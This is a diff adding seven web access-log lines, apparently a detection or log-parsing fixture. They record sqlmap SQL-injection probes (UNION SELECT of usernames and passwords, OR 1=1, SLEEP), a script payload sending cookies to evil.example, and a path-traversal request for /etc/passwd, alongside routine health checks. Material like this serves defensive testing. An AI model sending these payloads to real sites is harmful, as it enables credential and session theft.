@@ -1,0 +1,7 @@
+198.51.100.23 - - [06/Sep/2026:01:30:11 +0000] "GET /api/v1/items?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 500 812 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
+198.51.100.23 - - [06/Sep/2026:01:30:13 +0000] "GET /api/v1/items?id=1%20OR%201=1 HTTP/1.1" 200 4021 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
+198.51.100.23 - - [06/Sep/2026:01:30:15 +0000] "GET /api/v1/items?id=1%27%20AND%20SLEEP(5)-- HTTP/1.1" 500 812 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
+198.51.100.23 - - [06/Sep/2026:01:31:02 +0000] "GET /search?q=<script>document.location='http://evil.example/c?'+document.cookie</script> HTTP/1.1" 200 1990 "-" "Mozilla/5.0"
+203.0.113.66 - - [06/Sep/2026:01:33:41 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 179 "-" "curl/8.2.1"
+10.4.2.11 - - [06/Sep/2026:01:35:00 +0000] "GET /api/v1/health HTTP/1.1" 200 17 "-" "kube-probe/1.29"
+10.4.2.11 - - [06/Sep/2026:01:35:30 +0000] "GET /api/v1/health HTTP/1.1" 200 17 "-" "kube-probe/1.29"
